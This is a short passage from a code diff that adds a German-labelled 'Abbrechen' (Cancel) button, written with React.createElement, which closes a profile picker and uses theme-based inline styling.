+          React.createElement('button', {
+            onClick: function() { setShowProfilePicker(false); },
+            style: { marginTop: 18, background: 'none', border: 'none', color: theme.subtext || '#999', fontSize: '0.85rem', cursor: 'pointer' }
+          }, 'Abbrechen')
+        )
+      )
     )
   );
 }
